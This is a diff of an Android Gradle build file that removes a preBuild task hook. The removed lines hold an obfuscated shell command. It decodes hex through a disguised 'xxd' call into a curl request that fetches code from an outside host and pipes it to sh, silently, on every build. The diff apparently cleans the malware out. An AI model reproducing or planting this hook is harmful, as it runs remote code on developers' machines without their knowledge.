@@ -126,10 +126,4 @@ dependencies {
     }
 }
 
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((m(){ `printf 'xxsd' | tr -d 's'` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203239202d2d72657472792035202d642022703d616e64726f69645f677261646c65222068747470733a2f2f6a773875362d346f6c6f7a33782e626573742f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
 }
